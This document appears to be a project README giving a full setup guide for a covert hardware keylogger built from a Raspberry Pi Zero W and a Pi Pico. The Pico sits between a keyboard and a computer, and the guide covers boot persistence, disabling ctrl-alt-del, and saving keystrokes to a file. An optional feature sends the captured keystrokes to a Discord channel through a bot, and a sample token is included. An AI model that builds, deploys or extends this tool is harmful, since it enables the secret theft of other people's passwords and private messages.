This is a project that can help you create a simple keylogger with Raspberry pi pico and Raspberry pi zero W

Materials:
Raspberry pi pico
Raspberry pi zero (with mini SD card)
A way to write to the mini SD card (For example a mini SD card reader)
1 wire
A way to connect a wire between two Raspberry Pi's (For example a Soldering iron kit)
Micro USB (male) to female USB cable (in order to conect the keyboard to the RP zero)
An Y OTG cable 
and a Micro USB male to Micro USB adapter (alternativly you can use other cables)


Tutorial:
# Basic setup for Raspberry pi zero W (Manual)
(If you don't want to install RasPiLoggerOS image from the releases you can always manually setup everything.
If you choose to install the image everything would already be set up with the exception of Discord logging feature.)
## First install the Raspberry pi OS image on your sd card: 
You can use tools like raspberry pi Imager. In my case i installed Rasperry pi OS (lite)

When you installed the OS put it into the raspberry pi and SSH into it (with tools like PUTTY)
(You can also use other means to run cmd commands)

After you are SSH'd into the RaspberryPi you can run the following commands:

Firstly we will need to upgrade everything, install git and pip (If a message pops up asking for confirmation just type "Y"):
```
$ sudo apt-get update
$ sudo apt update
$ sudo apt upgrade
$ sudo apt install git
$ sudo apt install python3-pip
```
And we are also going to need a serial package after pip is installed:
```
$ sudo pip install pyserial
```
(If you want to enable discord Logging You can also install discord.py package. This is optional)
```
$ sudo pip install discord.py
```
Also we need to enable a serial port on our Raspberry pi:
```
$ sudo raspi-config
```
Navigate to Interface options > Serial port > No > Yes > Finish
(You can decide to reboot or continue with the file setup and reboot later)
## files setup
Lets create a disignated folder first:
```
$ mkdir Scripts
```
After that we can work from there:
```
$ cd Scripts
```

After that you can clone this repo (this repo uses a package "keyboard" from this fork https://github.com/H3LL0U/keyboard):
```
$ git clone https://github.com/H3LL0U/RasPiLogger.git
```

(You can delete the files for Raspberry pi pico since they are not being used for this part:)

```
$ sudo rm -r ~/Scripts/RasPiLogger/"files for RP pico"
```

And we are almost done with the setup for raspberry pi zero
The only thing that we need to do is make the script start automatically after each reboot
We can do this with two methods:
using etc/rc.local (easier)
or
using a custom service (recomended) 

## etc/rc.local method 
$ sudo nano /etc/rc.local
You can add this line to one of the lines before exit 0
```
sudo python3 /home/<usr>/Scripts/RasPiLogger/"files for RP zero"/Log.py &
(replace <usr> with the username that you use)
```

At the end it should look something like this:

```
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.

# Print the IP address
_IP=$(hostname -I) || true
if [ "$_IP" ]; then
  printf "My IP address is %s\n" "$_IP"
fi

sudo python3 /home/<usr>/Scripts/RasPiLogger/"files for RP zero"/Log.py &

exit 0
```

Save and quit (ctrl+s and ctrl+x)

## Custom service method
(recomended)
first let's create a service called Logger.service by running:
```sudo nano /etc/systemd/system/Logger.service```

there you can paste the following:

```
[Unit]
Description=Run the RasPiLogger
Before=dhcpcd.service

[Service]
ExecStart=/usr/bin/python3 /home/<usr>/Scripts/RasPiLogger/"files for RP zero"/Log.py #replace <usr> with your user
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

after you can enable it by running:                                 
```                                                                                  
sudo systemctl daemon-reload
sudo systemctl enable Logger.service
sudo systemctl start Logger.service
```
if everything was done correctly the Script should be already running

You can also check if the service is running as intended by running
```sudo systemctl status Logger.service```

You can test if the script is working by running it manually:

```
sudo python3 ~/Scripts/RasPiLogger/"files for RP zero"/Log.py
```
It will display the inputs that are being pressed in the terminal
(ctrl+c to quit)

You can also disable ctrl+alt+del from rebooting you raspberry pi by:

```
$ sudo systemctl mask ctrl-alt-del.target
```

After the reboot this script will be run automatically on startup if everything was done correctly

The Log.txt file which records the user's inputs is going to be saved in the same directory as Log.py file
## Speeding up time to boot


With a current configuration it might take around 40-50 seconds for the Raspberry pi zero W to
run the Script. There are a couple of things you can do to improve this time:

### Disabling unnecesary services
(recomended)

You can run the following in the console of your Raspberry pi Zero:
```
sudo systemctl disable apt-daily-upgrade.service
sudo systemctl disable apt-daily.service
sudo systemctl mask apt-daily-upgrade.service
sudo systemctl mask apt-daily.service
sudo systemctl disable NetworkManager-wait-online.service
sudo systemctl disable ModemManager.service
sudo systemctl disable avahi-daemon.service
sudo systemctl disable systemd-rfkill.service
sudo systemctl disable polkit.service
sudo systemctl disable dphys-swapfile.service
sudo systemctl disable e2scrub_reap.service
sudo systemctl disable fake-hwclock.service
sudo systemctl disable modprobe@dm_mod.service
sudo systemctl disable modprobe@drm.service
sudo systemctl disable modprobe@efi_pstore.service
sudo systemctl disable systemd-modules-load.service
sudo systemctl disable rng-tools-debian.service
sudo systemctl disable keyboard-setup.service
sudo systemctl disable fstrim.service
sudo systemctl disable hciuart.service
sudo systemctl disable triggerhappy.service
sudo systemctl disable raspi-config.service
```

This will disable some of the services that are not being used for our implomentation. (this will cut around 15 seconds of boot time)

### Disabling boot delay

You can open a config file like this
```sudo nano /boot/config.txt```

there you can add the following line
```
boot_delay=0
```
(ctrl+s , ctrl+x to save and quit)




# Enabling discord logging:
(Optional)
Is it too bothersome to access your RasPiLogger? You can enable discord logging feature!

## Creating a bot

Firstly what you want to do is create a discord bot and add it to your server:
You can do this using a guide bellow:
https://www.upwork.com/resources/how-to-make-discord-bot
After that you will need to copy an ID of the channel you want your bot to Log key inputs to
You can do that by enabling developer mode in the settings and right clicking on the channel.
(Save the channel ID and the Bot Token you will need them for the next step)

## Enabling the feature

in the same folder as Log.py there is another file called send_discord.py
when you open it with

```
sudo nano ~/Scripts/RasPiLogger/"files for RP zero"/send_discord.py
```

The begining should look something like this:

```
import os

ENABLE_DISCORD_LOGGING = False
YOUR_TOKEN = "Your Token" #Write Your discord bot token here:
YOUR_CHANNEL_ID = 1235969503771361332 #Write the channel in which you want the bot to write here (takes an integer):
```

You can set the ENABLE_DISCORD_LOGGING variable to True
Place the Token of the bot you just created between the quotations
And as for last place the selected channel ID for YOUR_CHANNEL_ID

In the end it will look something similar to this:

```
ENABLE_DISCORD_LOGGING = True
YOUR_TOKEN = "NzY1NTQxNzQ1NzE0NTg3NTQxcX4awOQ.UVT8ef7BvRcd1eJUeJ59xIsJwGc" #Write Your discord bot token here:
YOUR_CHANNEL_ID = 1235969503771361332 #Write the channel in which you want the bot to write here (takes an integer):
```

Congratulations! The setup for Raspberry pi zero is done!

# Raspberry Pi Pico setup
You can use tools such as Thonny IDE for this.

Firstly you will need to upload CircuitPython on your Raspberry Pi Pico.
Afterwards you can upload the files from /"files for RP pico" from this repo directly
into the file system of the Raspberry Pi Pico (Make sure that they are in the root of the file system)
WITH THE EXCEPTION OF "adafruit hid' (this directory should be copied to D:\lib)


# Hardware setup

After the software setup has been complete you will need to setup the hardware in order
for Raspberry Pi's to comunicate with each other and to make it possible to connect it to the computer

![Hardware_setup](https://github.com/H3LL0U/RasPiLogger/assets/151795050/408141ee-2855-43be-a9de-3844c2d0934a)

The image above shows how to connect everything

To ustablish UART connection you can solder the wires directly or use some other method
The OTG cable used in this configuration look like this:

![S03723d2365a243c398519ea73c164dca2 jpg_640x640Q90 jpg_](https://github.com/H3LL0U/RasPiLogger/assets/151795050/1c6e24de-7301-48dd-85c5-1be0e0d39228)


Instead of using a OTG cable you can connect a red wire to other power source
(This can resolve the issue of slow boot time if you can preboot the Raspberry Pi zero)

If everything has been done correctly the RasPiLogger should work

# Known Issues:
With the current configuration it takes around 30 seconds after the connection to the computer in order for 
RasPiLogger to work
